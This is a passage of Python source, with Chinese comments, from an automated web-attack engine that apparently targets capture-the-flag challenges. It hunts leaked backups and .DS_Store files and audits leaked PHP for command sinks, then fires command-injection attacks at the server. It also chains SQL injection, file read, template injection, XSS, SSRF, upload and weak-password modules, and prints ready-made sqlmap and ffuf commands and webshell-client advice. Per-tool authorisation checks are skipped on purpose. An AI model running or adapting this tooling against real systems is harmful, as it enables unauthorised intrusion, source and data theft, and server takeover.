        return ctx.is_soft(body)

    def magic_ok(name, body):
        """归档必须有对应魔数；文本备份不能是 HTML 错误页。
        路由器类靶机常把任意路径都重写到首页，单靠一次探针基线认不出来。"""
        n = name.lower()
        if n.endswith(".zip"):
            return body[:2] == b"PK"
        if n.endswith((".tar.gz", ".tgz")):
            return body[:2] == b"\x1f\x8b"
        if n.endswith(".tar"):
            return body[257:262] == b"ustar"
        if n.endswith(".rar"):
            return body[:4] == b"Rar!"
        head = body[:200].lower()
        return b"<html" not in head and b"<!doctype" not in head

    # .DS_Store：先解析出文件名，再逐个回读，命中 flag 直接返回
    ds = ctx.get(ctx.root.rstrip("/") + "/.DS_Store")
    if ds.get("status") == 200 and b"Bud1" in (ds.get("body") or b""):
        names_in_store = ds_store_names(ds.get("body") or b"")[:40]
        ctx.add("ds-store", ds["url"], evidence="解析出 %d 个文件名" % len(names_in_store),
                confidence="medium")
        ctx.log("[deep] .DS_Store 可下载，解析出 %d 个名字：%s"
                % (len(names_in_store), ", ".join(names_in_store[:12]) or "（空）"))
        for nm in names_in_store:
            if "/" in nm or " " in nm:
                continue
            item = ctx.get(ctx.root.rstrip("/") + "/" + nm)
            if item.get("status") == 200 and collect_flags(text_of(item)):
                ctx.log("[deep] .DS_Store 指向的 %s 直接给 flag" % nm)
                return True
        # 泄露出的脚本名往往就是真实入口（页面本身可能既无表单也无参数）：
        # 对这些脚本按常见参数名盲探，命中就把命令注入/文件读取矩阵打一遍。
        # 不能跳过 index.php——路由器类题目的 ?ip= 就写在 index.php 里，
        # 首页用 / 访问时反而看不出参数（路由重写把什么都回同一张页）。
        scripts = [n for n in names_in_store if n.lower().endswith(
            (".php", ".jsp", ".asp", ".aspx", ".do", ".action"))][:3]
        for nm in scripts:
            url = ctx.root.rstrip("/") + "/" + nm
            hits = guess_targets(ctx, base_url=url, names=SHORT_GUESS_PARAMS,
                                 probe_value=_lfi_probe_for({}, script=nm))
            if not hits:
                # 有的路由器题只吃 POST，GET 盲探全空就换 POST 再来一遍
                hits = guess_post_targets(ctx, base_url=url, names=SHORT_GUESS_PARAMS)
            for t in hits:
                ctx.log("[deep] .DS_Store 脚本 %s 命中隐藏参数 %s" % (nm, t["param"]))
                try:
                    test_cmdi(ctx, t)
                except AutoStop:
                    raise
                except Exception as exc:
                    ctx.log("[deep] %s 命令注入测试出错：%s" % (nm, exc))
                if ctx.flags:
                    return True
                try:
                    test_lfi(ctx, t)
                except AutoStop:
                    raise
                except Exception as exc:
                    ctx.log("[deep] %s 文件读取测试出错：%s" % (nm, exc))
                if ctx.flags:
                    return True

    # 先全部探一遍再统一判定：不同备份名返回完全相同的页面（同长度同内容）
    # 说明是路由重写出的 soft-404，一次探针基线可能探不到这种页面。
    import hashlib
    cands = []
    hash_count = {}
    for name in names:
        item = ctx.get(ctx.root.rstrip("/") + "/" + name)
        body = item.get("body") or b""
        if item.get("status") != 200 or len(body) < 200:
            continue
        if soft_404(body):
            ctx.log("[deep] %s 返回的是 soft-404 错误页，跳过" % name)
            continue
        h = hashlib.sha1(body).hexdigest()
        hash_count[h] = hash_count.get(h, 0) + 1
        cands.append((name, item, body, h))
    grouped = set()
    for name, item, body, h in cands:
        if hash_count[h] >= 3:
            if h not in grouped:
                grouped.add(h)
                ctx.log("[deep] %d 个备份名返回同一页面，判为路由重写 soft-404，全部跳过"
                        % hash_count[h])
            continue
        if not magic_ok(name, body):
            if collect_flags(text_of(item)):
                ctx.log("[deep] 备份文件正文里直接有 flag：%s" % item["url"])
                return True
            ctx.log("[deep] %s 内容不是有效归档（无魔数/疑似错误页），跳过" % name)
            continue
        ctx.add("backup-file", item["url"], evidence="%s 可下载（%d 字节）" % (name, len(body))
                , confidence="medium")
        if b"b0VIM" in body[:64]:
            text = vim_swap_text(body)
            if collect_flags(text):
                ctx.add("vim-swap", item["url"], evidence="vim 交换文件里还原出 flag")
                ctx.log("[deep] vim 缓存 %s 里还原出 flag" % name)
                return True
            ctx.add("vim-swap", item["url"], evidence="vim 交换文件可读，未直接含 flag")
        try:
            zf = zipfile.ZipFile(io.BytesIO(body))
        except Exception:
            if collect_flags(text_of(item)):
                ctx.log("[deep] 备份文件正文里直接有 flag：%s" % item["url"])
                return True
            continue
        for info in zf.infolist():
            if info.file_size > 2_000_000:
                continue
            # 包里的 flag 文件常是幌子，真值在服务器上同名路径
            base = info.filename.rsplit("/", 1)[-1]
            if "flag" in base.lower():
                served = ctx.get(ctx.root.rstrip("/") + "/" + base)
                if collect_flags(text_of(served)):
                    ctx.log("[deep] 备份包内文件名 %s 在服务器可直读" % base)
                    return True
            if "flag" in info.filename.lower() or info.file_size < 200_000:
                try:
                    data = zf.read(info.filename)
                except Exception:
                    continue
                text = data.decode("utf-8", "ignore")
                if collect_flags(text):
                    ctx.log("[deep] 备份包内 %s 命中 flag" % info.filename)
                    return True
        if not ctx.flags and audit_source_exploit(ctx, zf):
            return True
    return bool(ctx.flags)


AUDIT_SINK_RE = re.compile(r"\b(shell_exec|system|passthru|popen|proc_open|exec|eval|assert)\s*\(", re.I)
AUDIT_INPUT_RE = re.compile(r"\$_(GET|POST|REQUEST)\s*\[\s*['\"](\w+)['\"]\s*\]")
AUDIT_FILTER_RE = re.compile(r"preg_match\s*\(\s*(['\"])(.+?)\1", re.S)


def audit_source_exploit(ctx, zf):
    """源码泄露 -> 代码审计 -> 定向利用：泄露的 PHP 里找「用户输入进命令执行」
    的参数，对服务器对应路径直接打命令注入矩阵；过滤规则写进证据供人工复核。"""
    tried = set()
    for info in zf.infolist():
        if not info.filename.lower().endswith(".php") or info.file_size > 200_000:
            continue
        try:
            src = zf.read(info.filename).decode("utf-8", "ignore")
        except Exception:
            continue
        sinks = AUDIT_SINK_RE.findall(src)
        if not sinks:
            continue
        params = AUDIT_INPUT_RE.findall(src)
        if not params:
            continue
        filt = AUDIT_FILTER_RE.search(src)
        filt_note = ("；过滤规则 %s" % filt.group(2)[:120]) if filt else ""
        base = info.filename.rsplit("/", 1)[-1]
        rel = info.filename.replace("\\", "/")
        rel = re.sub(r"^(www|html|web|wwwroot|src)/", "", rel)
        urls = []
        for u in (ctx.root.rstrip("/") + "/" + rel, ctx.root.rstrip("/") + "/" + base):
            if u not in urls:
                urls.append(u)
        for method, param in params[:3]:
            kind = "post" if method.upper() == "POST" else "get"
            for u in urls:
                if (u, param) in tried:
                    continue
                tried.add((u, param))
                probe = ctx.get(u) if kind == "get" else ctx.post_form(u, {param: "1"})
                if probe.get("status") != 200 or ctx.is_soft(text_of(probe)):
                    continue
                target = {"kind": kind, "url": u, "param": param, "value": "1"}
                if kind == "post":
                    target["form"] = {"action": u, "method": "POST",
                                      "fields": {param: ""}, "files": []}
                ctx.add("source-audit", u, confidence="medium",
                        evidence="泄露源码 %s：%s 参数 %s 进入 %s%s"
                                 % (info.filename, method, param, sinks[0], filt_note))
                ctx.log("[deep] 源码审计：%s 的 %s 参数进 %s，定向打命令注入%s"
                        % (base, param, sinks[0], filt_note))
                test_cmdi(ctx, target)
                if ctx.flags:
                    return True
    return bool(ctx.flags)


def external_suggestions(ctx, fp, targets):
    """外部工具的具体命令：本引擎只做矩阵判断，深度利用交给这些成熟工具。"""
    base = ctx.url
    bare = _base_root(ctx.url).rstrip("/")
    out = []
    sqli_target = next((f for f in ctx.findings if f["type"].startswith("sqli")), None)
    xss_target = next((f for f in ctx.findings if f["type"].startswith("xss")), None)
    if sqli_target:
        out.append({"tool": "sqlmap", "why": "布尔/报错已成立，交给 sqlmap 摸库表",
                    "cmd": 'sqlmap -u "%s" --batch --level 2 --risk 1 --technique=BEUST '
                           '--output-dir=workspace\\sqlmap' % sqli_target["url"]})
    if xss_target:
        out.append({"tool": "xsstrike", "why": "反射已成立，交给 xsstrike 找可用上下文",
                    "cmd": 'xsstrike -u "%s" --blind' % xss_target["url"]})
    out.append({"tool": "dirsearch", "why": "扩目录词表，找上传点与备份",
                "cmd": 'dirsearch -u "%s" -e php,asp,jsp,txt,zip,bak' % base})
    out.append({"tool": "ffuf", "why": "对已确认的参数做参数名爆破",
                "cmd": 'ffuf -u "%s?FUZZ=1" -w wordlist.txt -mc 200,301,302' % bare})
    if any(f["type"] == "upload-exec" for f in ctx.findings):
        out.append({"tool": "手动 WebShell 客户端", "why": "上传已可执行，需要交互控制时用自备客户端",
                    "cmd": "使用自备的 AntSword / 冰蝎 / 哥斯拉 连接执行点；本工具不内置、不自动上传管理器"})
    return out


def build_next_steps(ctx):
    types = {f["type"] for f in ctx.findings}
    steps = []
    if "sqli-boolean" in types or "sqli-error" in types:
        steps.append("SQL 注入成立：先 union 爆库名表名，再按 information_schema 定位 flag 表。")
    if "sqli-time" in types:
        steps.append("时间盲注成立：用脚本二分跑字符，或直接把 URL 交给 sqlmap 的 --technique=T。")
    if "xss-reflected" in types:
        steps.append("反射型 XSS 成立：看是否进后台/工单页，结合 Cookie 或 CSRF 拿管理员侧数据。")
    if "lfi" in types or "lfi-source" in types:
        steps.append("文件读取成立：试 /proc/self/environ、日志包含、session 文件包含。")
    if "ssti" in types:
        steps.append("模板注入成立：按识别到的引擎走对应 RCE 链，先探被过滤的字符。")
    if "cmdi" in types:
        steps.append("命令注入成立：用无回显方式（写文件/带外）取 flag，本工具只验证回显标记。")
    if "upload-exec" in types:
        steps.append("上传已可执行：交互式控制请用自备客户端；本工具只写固定标记的测试文件。")
    if not steps:
        steps.append("矩阵未命中：手工看 JS 注释、响应头、Cookie 与隐藏参数，再用 dirsearch/ffuf 扩词表。")
    return steps


def campaign(url, log=print, max_requests=DEFAULT_MAX_REQUESTS, max_seconds=DEFAULT_MAX_SECONDS,
             cancel_event=None, allow_time=True, allow_upload=True, allow_union=True,
             stop_on_flag=True, description=""):
    """一次深度战役。返回可直接 json 序列化的 dict。

    授权已由启动时《软件责任说明》统一确认，这里不再做逐工具声明检查。
    """
    started_at = time.strftime("%Y-%m-%dT%H:%M:%S")
    ctx = Ctx(url, log=log, max_requests=max_requests, max_seconds=max_seconds,
              cancel_event=cancel_event, allow_time=allow_time, allow_upload=allow_upload,
              allow_union=allow_union)
    ctx.description = description or ""
    result = {"url": ctx.url, "started": started_at, "fingerprint": {}, "findings": [],
              "uploads": [], "flags": [], "next_steps": [], "external": [],
              "requests": 0, "stopped": "", "elapsed": 0}
    log("[deep] 目标 %s；深度矩阵，上限 %d 次请求 / %d 秒。"
        % (ctx.url, max_requests, int(max_seconds or DEFAULT_MAX_SECONDS)))
    t0 = time.time()
    try:
        fp = analyze(ctx)
        result["fingerprint"] = fp
        if fp.get("dead"):
            log("[deep] 目标环境已到期/已销毁，停止本轮（页面横幅里的彩蛋 flag 不计入结果）")
            result["stopped"] = "环境已到期"
            result["requests"] = ctx.budget.used
            result["elapsed"] = round(time.time() - t0, 1)
            result["findings"] = ctx.findings
            result["flags"] = []
            return result
        targets = build_targets(ctx, fp)
        log("[deep] 待测参数 %d 个：%s"
            % (len(targets), ", ".join("%s(%s)" % (t["param"], t["kind"]) for t in targets) or "无"))
        # 源码里带闸门的题（单测任一参数都「无反应」）先走链式探针，命中 flag 就能收手
        if fp.get("src_gates"):
            try:
                php_gate_chain(ctx, fp)
            except AutoStop:
                raise
            except Exception as exc:
                log("[deep] php_gate_chain 出错：%s" % exc)
        # 先做便宜的直读与上传：上传矩阵最容易因为预算被注入矩阵吃掉而跑不完
        flag_hunt(ctx)
        # v4.1：flag_hunt 已经把 robots/静态泄露的短文本收进 ctx.leaked_secrets，
        # 先拿它伪造签名 session（不需要 LFI 读源码），再走原来的源码链。
        if not ctx.flags and getattr(ctx, "leaked_secrets", None):
            try:
                leaked_secret_chain(ctx, fp)
            except AutoStop:
                raise
            except Exception as exc:
                log("[deep] leaked_secret_chain 出错：%s" % exc)
        # afr_3 类：LFI 读 server.py/key.py → 伪造 Flask session → SSTI 取 flag
        if not ctx.flags and _flask_hint(ctx, fp):
            try:
                flask_source_chain(ctx, fp)
            except AutoStop:
                raise
            except Exception as exc:
                log("[deep] flask_source_chain 出错：%s" % exc)
        result["uploads"] = test_upload(ctx, fp, stop_on_flag=stop_on_flag)
        # 登录表单与参数无关：即使没有可测参数也要试一遍弱口令
        try:
            test_login(ctx, fp)
        except AutoStop:
            raise
        except Exception as exc:
            log("[deep] test_login 出错：%s" % exc)
        # 模块顺序按"直接拿到 flag 的能力"排：注入/命令/文件读取能取 flag，
        # 模板与反射型 XSS 多数只报线索，排在后面；命中 flag 后立即收手。
        modules = (test_sqli, test_cmdi, test_thinkphp, test_lfi, test_ssti,
                   test_xss, test_ssrf)
        for target in targets:
            for fn in modules:
                if stop_on_flag and ctx.flags:
                    break
                try:
                    fn(ctx, target)
                except AutoStop:
                    raise
                except Exception as exc:
                    log("[deep] %s 在参数 %s 上出错：%s" % (fn.__name__, target["param"], exc))
            if stop_on_flag and ctx.flags:
                log("[deep] 已拿到 flag，按 flag 优先策略提前收手（完整模式可传 stop_on_flag=False）")
                break
        if not ctx.flags:
            dir_crawl(ctx)
        if not ctx.flags:
            test_nginx_alias(ctx)
        if not ctx.flags:
            backup_hunt(ctx)
    except AutoStop as exc:
        result["stopped"] = str(exc)
        log("[deep] 提前收手：%s" % exc)
    except Exception as exc:
        result["stopped"] = "异常终止：%s" % exc
        log("[deep] 异常终止：%s" % exc)
    result["findings"] = ctx.findings
    result["flags"] = ctx.flags
    result["requests"] = ctx.budget.used
    result["elapsed"] = round(time.time() - t0, 1)
    result["next_steps"] = build_next_steps(ctx)
    result["external"] = external_suggestions(ctx, result["fingerprint"], [])
    log("[deep] 结束：%d 次请求 / %.1fs，发现 %d 条，flag %d 个%s"
        % (result["requests"], result["elapsed"], len(result["findings"]), len(result["flags"]),
           ("，提前收手：" + result["stopped"]) if result["stopped"] else ""))
    return result


def render(result):
    """把结果整理成人类可读文本，GUI 与 CLI 都直接用它。"""
    lines = []
    fp = result.get("fingerprint") or {}
    lines.append("== 目标 ==")
    lines.append(result.get("url", ""))
    lines.append("标题：%s｜技术线索：%s｜表单 %d 个｜带参链接 %d 条"
                 % (fp.get("title") or "(无)", ",".join(fp.get("tech") or []) or "未识别",
                    len(fp.get("forms") or []), len(fp.get("links") or [])))
    lines.append("请求数：%d｜耗时：%ss%s"
                 % (result.get("requests", 0), result.get("elapsed", 0),
                    ("｜提前收手：" + result["stopped"]) if result.get("stopped") else ""))
    lines.append("")
    lines.append("== 发现 ==")
    if result.get("findings"):
        for f in result["findings"]:
            lines.append("[%s] %s" % (f["type"], f["url"]))
            if f.get("payload"):
                lines.append("    payload: %s" % f["payload"])
            if f.get("evidence"):
                lines.append("    证据: %s" % f["evidence"])
    else:
        lines.append("矩阵未命中。")
    lines.append("")
    lines.append("== FLAG ==")
    if result.get("flags"):
        for f in result["flags"]:
            lines.append("%s   （来源 %s）" % (f["value"], f["source"]))
    else:
        lines.append("未拿到 flag。")
    lines.append("")
    lines.append("== 下一步 ==")
    for s in result.get("next_steps") or []:
        lines.append("- " + s)
    if result.get("external"):
        lines.append("")
        lines.append("== 外部工具（复制即可） ==")
        for e in result["external"]:
            lines.append("# %s：%s" % (e["tool"], e["why"]))
            lines.append(e["cmd"])
    return "\n".join(lines)


def save_report(result):
    os.makedirs(REPORTS_DIR, exist_ok=True)
    path = os.path.join(REPORTS_DIR, "webattack_%s_%s.json"
                        % (time.strftime("%Y%m%d_%H%M%S"), uuid.uuid4().hex[:6]))
    with open(path, "w", encoding="utf-8") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    return path
